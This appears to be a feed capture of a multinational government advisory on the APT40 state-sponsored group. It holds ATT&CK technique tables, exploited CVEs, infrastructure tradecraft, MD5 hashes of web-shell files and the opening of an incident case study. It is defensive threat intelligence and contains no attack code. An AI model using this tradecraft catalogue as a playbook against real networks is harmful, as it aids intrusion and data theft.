<p>The information in this report is being provided “as is” for informational purposes only. The authoring agencies do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the authoring agencies.</p>
<h2><strong>MITRE ATT&amp;CK – Historical APT40 Tradecraft of Interest</strong></h2>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Reconnaissance (TA0043)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Search Victim-Owned Websites [T1594] &nbsp;</td>
<td>Gather Victim Identity Information: Credentials [T1589.001]&nbsp;</td>
</tr>
<tr>
<td>Active Scanning: Vulnerability Scanning [T1595.002]&nbsp;</td>
<td>Gather Victim Host Information [T1592]</td>
</tr>
<tr>
<td>Search Open Websites/Domains: Search Engines [T1593.002]</td>
<td>Gather Victim Network Information: Domain Properties [T1590.001]</td>
</tr>
<tr>
<td>Gather Victim Identity Information: Email Addresses [T1589.002]</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Resource Development (TA0042)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Acquire Infrastructure: Domains [T1583.001] &nbsp;</td>
<td>Acquire Infrastructure [T1583]</td>
</tr>
<tr>
<td>Acquire Infrastructure: DNS Server [T1583.002] &nbsp;</td>
<td>Compromise Accounts [T1586]</td>
</tr>
<tr>
<td>Develop Capabilities: Code Signing Certificates [T1587.002]&nbsp;</td>
<td>Compromise Infrastructure [T1584]</td>
</tr>
<tr>
<td>Develop Capabilities: Digital Certificates [T1587.003]&nbsp;</td>
<td>Develop Capabilities: Malware [T1587.001]</td>
</tr>
<tr>
<td>Obtain Capabilities: Code Signing Certificates [T1588.003]</td>
<td>Establish Accounts: Cloud Accounts [T1585.003]</td>
</tr>
<tr>
<td>Compromise Infrastructure: Network Devices [T1584.008]</td>
<td>Obtain Capabilities: Digital Certificates [T1588.004]</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Initial Access (TA0001)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Valid Accounts [T1078]&nbsp;</td>
<td>Phishing [T1566]</td>
</tr>
<tr>
<td>Valid Accounts: Default Accounts [T1078.001] &nbsp;</td>
<td>Phishing: Spearphishing Attachment [T1566.001] &nbsp;</td>
</tr>
<tr>
<td>Valid Accounts: Domain Accounts [T1078.002] &nbsp;</td>
<td>Phishing: Spearphishing Link [T1566.002]</td>
</tr>
<tr>
<td>External Remote Services [T1133]</td>
<td>Exploit Public-Facing Application [T1190]</td>
</tr>
<tr>
<td>Drive-by Compromise [T1189]&nbsp;</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Execution (TA0002)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Windows Management Instrumentation [T1047] &nbsp;</td>
<td>Command and Scripting Interpreter: Python [T1059.006]&nbsp;</td>
</tr>
<tr>
<td>Scheduled Task/Job: At [T1053.002]&nbsp;</td>
<td>Command and Scripting Interpreter: JavaScript [T1059.007]&nbsp;</td>
</tr>
<tr>
<td>Scheduled Task/Job: Scheduled Task [T1053.005] &nbsp;</td>
<td>Native API [T1106]&nbsp;</td>
</tr>
<tr>
<td>Command and Scripting Interpreter [T1059] &nbsp;</td>
<td>Inter-Process Communication [T1559]&nbsp;</td>
</tr>
<tr>
<td>Command and Scripting Interpreter: Windows Command Shell [T1059.003]&nbsp;</td>
<td>System Services: Service Execution [T1569.002] &nbsp;</td>
</tr>
<tr>
<td>Command and Scripting Interpreter: PowerShell [T1059.001]&nbsp;</td>
<td>Exploitation for Client Execution [T1203] &nbsp;</td>
</tr>
<tr>
<td>Command and Scripting Interpreter: Visual Basic [T1059.005]&nbsp;</td>
<td>User Execution: Malicious File [T1204.002] &nbsp;</td>
</tr>
<tr>
<td>Command and Scripting Interpreter: Unix Shell [T1059.004]</td>
<td>Command and Scripting Interpreter: Apple Script [T1059.002]</td>
</tr>
<tr>
<td>Scheduled Task/Job: Cron [T1053.003]</td>
<td>Software Deployment Tools [T1072]</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Persistence (TA0003)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Valid Accounts [T1078]&nbsp;</td>
<td>Server Software Component: Web Shell [T1505.003]&nbsp;</td>
</tr>
<tr>
<td>Office Application Startup: Office Template Macros [T1137.001]</td>
<td>Create or Modify System Process: Windows Service [T1543.003]&nbsp;</td>
</tr>
<tr>
<td>Scheduled Task/Job: At [T1053.002]&nbsp;</td>
<td>Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder [T1547.001]&nbsp;</td>
</tr>
<tr>
<td>Scheduled Task/Job: Scheduled Task [T1053.005] &nbsp;</td>
<td>Boot or Logon Autostart Execution: Shortcut Modification [T1547.009]&nbsp;</td>
</tr>
<tr>
<td>External Remote Services [T1133]&nbsp;</td>
<td>Hijack Execution Flow: DLL Search Order Hijacking [T1574.001]&nbsp;</td>
</tr>
<tr>
<td>Scheduled Task/Job: Cron [T1053.003] &nbsp;</td>
<td>Hijack Execution Flow: DLL Side-Loading [T1574.002]&nbsp;</td>
</tr>
<tr>
<td>Account Manipulation [T1098]</td>
<td>Valid Accounts: Cloud Accounts [T1078.004]</td>
</tr>
<tr>
<td>Valid Accounts: Domain Accounts [T1078.002]</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Privilege Escalation (TA0004)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Scheduled Task/Job: At [T1053.002]&nbsp;</td>
<td>Create or Modify System Process: Windows Service [T1543.003]&nbsp;</td>
</tr>
<tr>
<td>Scheduled Task/Job: Scheduled Task [T1053.005] &nbsp;</td>
<td>Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder [T1547.001]&nbsp;</td>
</tr>
<tr>
<td>Process Injection: Thread Execution Hijacking [T1055.003]&nbsp;</td>
<td>Boot or Logon Autostart Execution: Shortcut Modification [T1547.009]&nbsp;</td>
</tr>
<tr>
<td>Process Injection: Process Hollowing [T1055.012]</td>
<td>Hijack Execution Flow: DLL Search Order Hijacking [T1574.001]</td>
</tr>
<tr>
<td>Valid Accounts: Domain Accounts [T1078.002]</td>
<td>Exploitation for Privilege Escalation [T1068]</td>
</tr>
<tr>
<td>Access Token Manipulation: Token Impersonation/Theft [T1134.001]</td>
<td>Event Triggered Execution: Unix Shell Configuration Modification [T1546.004]</td>
</tr>
<tr>
<td>Process Injection: Dynamic-link Library Injection [T1055.001]</td>
<td>Valid Accounts: Domain Accounts [T1078.002]</td>
</tr>
<tr>
<td>Valid Accounts: Local Accounts [T1078.003]</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Defense Evasion (TA0005)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Rootkit [T1014]&nbsp;</td>
<td>Indirect Command Execution [T1202]&nbsp;</td>
</tr>
<tr>
<td>Obfuscated Files or Information [T1027] &nbsp;</td>
<td>System Binary Proxy Execution: Mshta [T1218.005]&nbsp;</td>
</tr>
<tr>
<td>Obfuscated Files or Information: Software Packing [T1027.002]&nbsp;</td>
<td>System Binary Proxy Execution: Regsvr32 [T1218.010]&nbsp;</td>
</tr>
<tr>
<td>Obfuscated Files or Information: Steganography [T1027.003]&nbsp;</td>
<td>Subvert Trust Controls: Code Signing [T1553.002]&nbsp;</td>
</tr>
<tr>
<td>Obfuscated Files or Information: Compile After Delivery [T1027.004]&nbsp;</td>
<td>File and Directory Permissions Modifications: Linux and Mac File and Directory Permissions Modification [T1222.002] &nbsp;</td>
</tr>
<tr>
<td>Masquerading: Match Legitimate Name or Location [T1036.005]&nbsp;</td>
<td>Virtualisation/Sandbox Evasion: System Checks [T1497.001]&nbsp;</td>
</tr>
<tr>
<td>Process Injection: Thread Execution Hijacking [T1055.003]</td>
<td>Masquerading [T1036]</td>
</tr>
<tr>
<td>Reflective Code Loading [T1620]</td>
<td>Impair Defences: Disable or Modify System Firewall [T1562.004]&nbsp;</td>
</tr>
<tr>
<td>Process Injection: Process Hollowing [T1055.012]&nbsp;</td>
<td>Hide Artifacts: Hidden Files and Directories [T1564.001]&nbsp;</td>
</tr>
<tr>
<td>Indicator Removal: File Deletion [T1070.004] &nbsp;</td>
<td>Hide Artifacts: Hidden Window [T1564.003] &nbsp;</td>
</tr>
<tr>
<td>Indicator Removal: Timestomp [T1070.006] &nbsp;</td>
<td>Hijack Execution Flow: DLL Search Order Hijacking [T1574.001]&nbsp;</td>
</tr>
<tr>
<td>Indicator Removal: Clear Windows Event Logs [T1070.001]</td>
<td>Hijack Execution Flow: DLL Side-Loading [T1574.002]&nbsp;</td>
</tr>
<tr>
<td>Modify Registry [T1112]&nbsp;</td>
<td>Web Service [T1102]&nbsp;</td>
</tr>
<tr>
<td>Deobfuscate/Decode Files or Information [T1140]&nbsp;</td>
<td>Masquerading: Masquerade Task or Service [T1036.004]</td>
</tr>
<tr>
<td>Impair Defenses [T1562]</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Credential Access (TA0006)</th>
</tr>
</thead>
<tbody>
<tr>
<td>OS Credential Dumping: LSASS Memory [T1003.001] &nbsp;</td>
<td>Unsecured Credentials: Credentials in Files [T1552.001]</td>
</tr>
<tr>
<td>OS Credential Dumping: NTDS [T1003.003] &nbsp;</td>
<td>Brute Force: Password Guessing [T1110.001]</td>
</tr>
<tr>
<td>Network Sniffing [T1040]&nbsp;</td>
<td>Forced Authentication [T1187]</td>
</tr>
<tr>
<td>Credentials from Password Stores: Keychain [T1555.001]</td>
<td>Steal or Forge Kerberos Tickets: Kerberoasting [T1558.003]&nbsp;</td>
</tr>
<tr>
<td>Input Capture: Keylogging [T1056.001]&nbsp;</td>
<td>Multi-Factor Authentication Interception [T1111]</td>
</tr>
<tr>
<td>Steal Web Session Cookie [T1539]&nbsp;</td>
<td>Steal Application Access Token [T1528]</td>
</tr>
<tr>
<td>Exploitation for Credential Access [T1212]</td>
<td>Brute Force: Password Cracking [T1110.002]</td>
</tr>
<tr>
<td>Input Capture: Web Portal Capture [T1056.003]</td>
<td>OS Credential Dumping: DCSync [T1003.006]</td>
</tr>
<tr>
<td>Credentials from Password Stores [T1555]&nbsp;</td>
<td>Credentials from Password Stores: Credentials from Web Browsers [T1555.003]</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Discovery (TA0007)</th>
</tr>
</thead>
<tbody>
<tr>
<td>System Service Discovery [T1007]&nbsp;</td>
<td>System Information Discovery [T1082] &nbsp;</td>
</tr>
<tr>
<td>Application Window Discovery [T1010] &nbsp;</td>
<td>Account Discovery: Local Account [T1087.001] &nbsp;</td>
</tr>
<tr>
<td>Query Registry [T1012]&nbsp;</td>
<td>System Information Discovery, Technique T1082 - Enterprise | MITRE ATT&amp;CK®</td>
</tr>
<tr>
<td>File and Directory Discovery [T1083]</td>
<td>System Time Discovery [T1124]&nbsp;</td>
</tr>
<tr>
<td>Network Service Discovery [T1046]&nbsp;</td>
<td>System Owner/User Discovery [T1033]&nbsp;</td>
</tr>
<tr>
<td>Remote System Discovery [T1018]&nbsp;</td>
<td>Domain Trust Discovery [T1482]&nbsp;</td>
</tr>
<tr>
<td>Account Discovery: Email Account [T1087.003]</td>
<td>Account Discovery: Domain Account [T1087.002]</td>
</tr>
<tr>
<td>System Network Connections Discovery [T1049]&nbsp;</td>
<td>Virtualisation/Sandbox Evasion: System Checks [T1497.001]&nbsp;</td>
</tr>
<tr>
<td>Process Discovery [T1057]&nbsp;</td>
<td>Software Discovery [T1518]&nbsp;</td>
</tr>
<tr>
<td>Permission Groups Discovery: Domain Groups [T1069.002]&nbsp;</td>
<td>Network Share Discovery, Technique T1135 - Enterprise | MITRE ATT&amp;CK®</td>
</tr>
<tr>
<td>System Network Configuration Discovery: Internet Connection Discovery [T1016.001]</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Lateral Movement (TA0008)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote Services: Remote Desktop Protocol [T1021.001]&nbsp;</td>
<td>Remote Services [T1021]</td>
</tr>
<tr>
<td>Remote Services: SMB/Windows Admin Shares [T1021.002]&nbsp;</td>
<td>Use Alternate Authentication Material: Pass the Ticket [T1550.003]</td>
</tr>
<tr>
<td>Remote Services: Windows Remote Management [T1021.006]&nbsp;</td>
<td>Lateral Tool Transfer [T1570]&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Collection (TA0009)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Data from Local System [T1005]&nbsp;</td>
<td>Archive Collected Data: Archive via Library [T1560.002]</td>
</tr>
<tr>
<td>Data from Network Shared Drive [T1039] &nbsp;</td>
<td>Email Collection: Remote Email Collection [T1114.002]&nbsp;</td>
</tr>
<tr>
<td>Input Capture: Keylogging [T1056.001]&nbsp;</td>
<td>Clipboard Data [T1115]&nbsp;</td>
</tr>
<tr>
<td>Automated Collection [T1119]</td>
<td>Data from Information Repositories [T1213]</td>
</tr>
<tr>
<td>Input Capture: Web Portal Capture [T1056.003]</td>
<td>Data Staged: Remote Data Staging [T1074.002]&nbsp;</td>
</tr>
<tr>
<td>Data Staged: Local Data Staging [T1074.001]&nbsp;</td>
<td>Archive Collected Data [T1560]</td>
</tr>
<tr>
<td>Email Collection [T1114]</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Exfiltration (TA0010)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exfiltration Over C2 Channel [T1041] &nbsp;</td>
<td>Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol [T1048.002]</td>
</tr>
<tr>
<td>Exfiltration Over Alternative Protocol [T1048]&nbsp;</td>
<td>Exfiltration Over Web Service: Exfiltration to Cloud Storage [T1567.002]</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Command and Control (TA0011)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Data Obfuscation: Protocol Impersonation [T1001.003]&nbsp;</td>
<td>Web Service: Dead Drop Resolver [T1102.001] &nbsp;</td>
</tr>
<tr>
<td>Commonly Used Port [T1043]&nbsp;</td>
<td>Web Service: One-way Communication [T1102.003]</td>
</tr>
<tr>
<td>Application Layer Protocol: Web Protocols [T1071.001]&nbsp;</td>
<td>Ingress Tool Transfer [T1105]&nbsp;</td>
</tr>
<tr>
<td>Application Layer Protocol: File Transfer Protocols [T1071.002]</td>
<td>Proxy: Internal Proxy [T1090.001]</td>
</tr>
<tr>
<td>Proxy: External Proxy [T1090.002]&nbsp;</td>
<td>Non-Standard Port [T1571]&nbsp;</td>
</tr>
<tr>
<td>Proxy: Multi-hop Proxy [T1090.003]&nbsp;</td>
<td>Protocol Tunnelling [T1572]&nbsp;</td>
</tr>
<tr>
<td>Web Service: Bidirectional Communication [T1102.002]&nbsp;</td>
<td>Encrypted Channel [T1573]&nbsp;</td>
</tr>
<tr>
<td>Encrypted Channel: Asymmetric Cryptography [T1573.002]</td>
<td>Ingress Tool Transfer [T1105]</td>
</tr>
<tr>
<td>Proxy, Technique T1090 - Enterprise | MITRE ATT&amp;CK®</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Impact (TA0040)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Service Stop [T1489]&nbsp;</td>
<td>Disk Wipe [T1561]</td>
</tr>
<tr>
<td>System Shutdown/Reboot [T1529]&nbsp;</td>
<td>Resource Hijacking [T1496]&nbsp;</td>
</tr>
</tbody>
</table>
<h2><strong>Notes</strong></h2>
<div>
<p>[1]&nbsp;U.S. Department of Justice. 2021.&nbsp;<a href=\"https://www.justice.gov/opa/pr/four-chinese-nationals-working-ministry-state-security-charged-global-computer-intrusion\" title=\"Four Chinese Nationals Working with the Ministry of State Security Charged with Global Computer Intrusion Campaign Targeting Intellectual Property and Confidential Business Information, Including Infectious Disease Research\">Four Chinese Nationals Working with the Ministry of State Security Charged with Global Computer Intrusion Campaign Targeting Intellectual Property and Confidential Business Information, Including Infectious Disease Research.</a><br>[2] In this context, an endpoint is a function of the web application.<br>[3] Service accounts are not tied to individual users, but rather to services. In a Microsoft corporate domain, there are various kinds of accounts.<br>[4] Mounting shares is the process of making files on a file system structure accessible to a user or user group.</p>
</div>
</div>
<p>&nbsp;</p>" "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-190a" (26251 46789) new 8 nil nil ((title nil "People’s Republic of China (PRC) Ministry of State Security APT40 Tradecraft in Action ") (link nil "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-190a") (description nil "<h2><strong>Overview</strong></h2>
<h3>Background</h3>
<p>This advisory, authored by the Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC), the United States Cybersecurity and Infrastructure Security Agency (CISA), the United States National Security Agency (NSA), the United States Federal Bureau of Investigation (FBI), the United Kingdom National Cyber Security Centre (NCSC-UK), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NCSC-NZ), the German Federal Intelligence Service (BND) and Federal Office for the Protection of the Constitution (BfV), the Republic of Korea’s National Intelligence Service (NIS) and NIS’ National Cyber Security Center, and Japan’s National Center of Incident Readiness and Strategy for Cybersecurity (NISC) and National Police Agency (NPA)—hereafter referred to as the “authoring agencies”—outlines a People’s Republic of China (PRC) state-sponsored cyber group and their current threat to Australian networks. The advisory draws on the authoring agencies’ shared understanding of the threat as well as ASD’s ACSC incident response investigations.</p>
<p>The PRC state-sponsored cyber group has previously targeted organizations in various countries, including Australia and the United States, and the techniques highlighted below are regularly used by other PRC state-sponsored actors globally. Therefore, the authoring agencies believe the group, and similar techniques remain a threat to their countries’ networks as well.</p>
<p>The authoring agencies assess that this group conduct malicious cyber operations for the PRC Ministry of State Security (MSS). The activity and techniques overlap with the groups tracked as Advanced Persistent Threat (APT) 40 (also known as Kryptonite Panda, GINGHAM TYPHOON, Leviathan and Bronze Mohawk in industry reporting). This group has previously been reported as being based in Haikou, Hainan Province, PRC and receiving tasking from the PRC MSS, Hainan State Security Department.[1]</p>
<p>The following Advisory provides a sample of significant case studies of this adversary’s techniques in action against two victim networks. The case studies are consequential for cybersecurity practitioners to identify, prevent and remediate APT40 intrusions against their own networks. The selected case studies are those where appropriate remediation has been undertaken reducing the risk of re-exploitation by this threat actor, or others. As such, the case studies are naturally older in nature, to ensure organizations were given the necessary time to remediate.</p>
<p>To download the PDF version of this report, visit the following link, <a href=\"https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/apt40-advisory-prc-mss-tradecraft-in-action\">APT40 Advisory</a>.</p>
<h3>Activity Summary</h3>
<p>APT40 has repeatedly targeted Australian networks as well as government and private sector networks in the region, and the threat they pose to our networks is ongoing. The tradecraft described in this advisory is regularly observed against Australian networks.</p>
<p>Notably, APT40 possesses the capability to rapidly transform and adapt exploit proof-of-concept(s) (POCs) of new vulnerabilities and immediately utilize them against target networks possessing the infrastructure of the associated vulnerability. APT40 regularly conducts reconnaissance against networks of interest, including networks in the authoring agencies’ countries, looking for opportunities to compromise its targets. This regular reconnaissance postures the group to identify vulnerable, end-of-life or no longer maintained devices on networks of interest, and to rapidly deploy exploits. APT40 continues to find success exploiting vulnerabilities from as early as 2017.</p>
<p>APT40 rapidly exploits newly public vulnerabilities in widely used software such as Log4J (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-44228\" title=\"CVE-2021-44228\">CVE-2021-44228</a>), Atlassian Confluence (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-31207\" title=\"CVE-2021-31207\">CVE-2021-31207</a>,&nbsp;<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-26084\" title=\"CVE-2021-26084\">CVE-2021-26084</a>) and Microsoft Exchange (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-31207\" title=\"CVE-2021-31207\">CVE-2021-31207</a>,&nbsp;<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-34523\" title=\"CVE-2021-34523\">CVE-2021-34523</a>,&nbsp;<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-34473\" title=\"CVE-2021-34473\">CVE-2021-34473</a>). ASD’s ACSC and the authoring agencies expect the group to continue using POCs for new high-profile vulnerabilities within hours or days of public release.</p>
  
  
  
  
<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-07/AA24-190A-apt40-figure-1_0.png?itok=a7YAYqy0\" width=\"1024\" height=\"685\" alt=\"Figure 1: TTP Flowchart for APT40 Activity\">


</div>
  </figure>
<p>Figure 1: TTP Flowchart for APT40 activity</p>
<p>This group appears to prefer exploiting vulnerable, public-facing infrastructure over techniques that require user interaction, such as phishing campaigns, and places a high priority on obtaining valid credentials to enable a range of follow-on activities. APT40 regularly uses web shells [<a href=\"https://attack.mitre.org/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a>] for persistence, particularly early in the life cycle of an intrusion. Typically, after successful initial access APT40 focuses on establishing persistence to maintain access on the victim’s environment. However, as persistence occurs early in an intrusion, it is more likely to be observed in all intrusions—regardless of the extent of compromise or further actions taken.</p>
<h3>Notable Tradecraft</h3>
<p>Although APT40 has previously used compromised Australian websites as command and control (C2) hosts for its operations, the group have evolved this technique [<a href=\"https://attack.mitre.org/techniques/T1594/\" title=\"Search Victim-Owned Websites\">T1594</a>].</p>
<p>APT40 has embraced the global trend of using compromised devices, including small-office/home-office (SOHO) devices, as operational infrastructure and last-hop redirectors [<a href=\"https://attack.mitre.org/techniques/T1584/008/\" title=\"Compromise Infrastructure: Network Devices\">T1584.008</a>] for its operations in Australia. This has enabled the authoring agencies to better characterize and track this group’s movements.</p>
<p>Many of these SOHO devices are end-of-life or unpatched and offer a soft target for N-day exploitation. Once compromised, SOHO devices offer a launching point for attacks that is designed to blend in with legitimate traffic and challenge network defenders [<a href=\"https://attack.mitre.org/techniques/T1001/003/\" title=\"Data Obfuscation: Protocol Impersonation\">T1001.003</a>].</p>
<p>This technique is also regularly used by other PRC state-sponsored actors worldwide, and the authoring agencies consider this to be a shared threat. For additional information, see joint advisories <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-158a\" title=\"People’s Republic of China State-Sponsored Cyber Actors Exploit Network Providers and Devices\">People’s Republic of China State-Sponsored Cyber Actors Exploit Network Providers and Devices</a> and <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a\" title=\"PRC State-Sponsored Actors Compromise and Maintain Persistent Access to U.S. Critical Infrastructure\">PRC State-Sponsored Actors Compromise and Maintain Persistent Access to U.S. Critical Infrastructure</a>.</p>
<p>APT40 does occasionally use procured or leased infrastructure as victim-facing C2 infrastructure in its operations; however, this tradecraft appears to be in relative decline.</p>
<h3>Tooling</h3>
<p>ASD’s ACSC are sharing some of the malicious files identified during the investigations outlined below. These files have been uploaded to VirusTotal to enable the wider network defense and cyber security communities to better understand the threats they need to defend against.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">MD5</th>
<th role=\"columnheader\">Filename</th>
<th role=\"columnheader\">Additional information</th>
</tr>
</thead>
<tbody>
<tr>
<td>26a5a7e71a601be991073c78d513dee3</td>
<td><a href=\"https://www.virustotal.com/gui/file/44369783a819a38909e89449495fb98c3f9ba07dd0d2fa55a24a560a89f21a86/details\" title=\"horizon.jsp\">horizon.jsp</a></td>
<td>1 kB | Java Source</td>
</tr>
<tr>
<td>87c88f06a7464db2534bc78ec2b915de</td>
<td><a href=\"https://www.virustotal.com/gui/file/b1cca678dbd6bd51e6e8e797b95dc3050a74f5fa8147603473d6229023f1eb1a/details\" title=\"Index_jsp$ProxyEndpoint$Attach.class\">Index_jsp$ProxyEndpoint$Attach.class</a></td>
<td>597 B | Java Bytecode</td>
</tr>
<tr>
<td>6a9bc68c9bc5cefaf1880ae6ffb1d0ca</td>
<td><a href=\"https://www.virustotal.com/gui/file/71f6b36bfddda2d3a506574991a44636f84df28f9350e7856d1cc8af07cdd821/details\" title=\"Index_jsp.class\">Index_jsp.class</a></td>
<td>5 kB | Java Bytecode</td>
</tr>
<tr>
<td>64454645a9a21510226ab29e01e76d39</td>
<td><a href=\"https://www.virustotal.com/gui/file/97daa26c59e0e151f66872147ccd30dd1815bc6e63ec40c288130c6e8a6ea992/details\" title=\"Index_jsp.java\">Index_jsp.java</a></td>
<td>5 kB | Java Source</td>
</tr>
<tr>
<td>e2175f91ce3da2e8d46b0639e941e13f</td>
<td><a href=\"https://www.virustotal.com/gui/file/1a2282cc4c13bd24b2ca20c494cacbd283fbdcc4864d9cde26ea55db800f4dda/details\" title=\"Index_jsp$ProxyEndpoint.class\">Index_jsp$ProxyEndpoint.class</a></td>
<td>4 kB | Java Bytecode</td>
</tr>
<tr>
<td>9f89f069466b8b5c9bf25c9374a4daf8</td>
<td><a href=\"https://www.virustotal.com/gui/file/0e3324587a07df499e97b58076a94e86bf5598cc6d9606c2dcee3941175ff043/details\" title=\"Index_jsp$ProxyEndpoint$1.class\">Index_jsp$ProxyEndpoint$1.class</a></td>
<td>3 kB | Java Bytecode</td>
</tr>
<tr>
<td>187d6f2ed2c80f805461d9119a5878ac</td>
<td><a href=\"https://www.virustotal.com/gui/file/2aad0f8b439c3824d51871a0744c0e2f578277e0ec73effe5a24c49d8048bc74/details\" title=\"Index_jsp$ProxyEndpoint$2.class\">Index_jsp$ProxyEndpoint$2.class</a></td>
<td>1 kB | Java Bytecode</td>
</tr>
<tr>
<td>ed7178cec90ed21644e669378b3a97ec</td>
<td><a href=\"https://www.virustotal.com/gui/file/882f39945974aa5fc6005bf646ee3ab21bf69de12985d6ad8cc497dbfe520728/details\" title=\"Nova_jsp.class\">Nova_jsp.class</a></td>
<td>7 kB | Java Bytecode</td>
</tr>
<tr>
<td>5bf7560d0a638e34035f85cd3788e258</td>
<td><a href=\"https://www.virustotal.com/gui/file/b271e74ed44c3c405da858f29b6dfd4a99658dcac7bc83938079ad0dbbdf1b66/details\" title=\"Nova_jsp$TomcatListenerMemShellFromThread.class\">Nova_jsp$TomcatListenerMemShellFromThread.class</a></td>
<td>8 kB | Java Bytecode</td>
</tr>
<tr>
<td>e02be0dc614523ddd7a28c9e9d500cff</td>
<td><a href=\"https://www.virustotal.com/gui/file/7c7acd87b47d405da4d6efa2c43599148e12c094970ba198905f0a165d79a78f/details\" title=\"Nova_jsp.java\">Nova_jsp.java</a></td>
<td>15 kB | Java Source</td>
</tr>
</tbody>
</table>
<h3>Case Studies</h3>
<p>ASD’s ACSC are sharing two anonymized investigative reports to provide awareness of how the actors employ their tools and tradecraft.</p>
<h2><strong>Case Study 1</strong></h2>
<h5>This report has been anonymized to enable wider dissemination. The impacted organization is hereafter referred to as “the organization.” Some specific details have been removed to protect the identity of the victim and incident response methods of ASD’s ACSC.</h5>
<div>
<h3>Executive Summary</h3>
<p>This report details the findings of the ASD’s ACSC investigation into the successful compromise of the organization’s network between July and September 2022. This investigative report was provided to the organization to summarize observed malicious activity and frame remediation recommendations. The findings indicate the compromise was undertaken by APT40.</p>
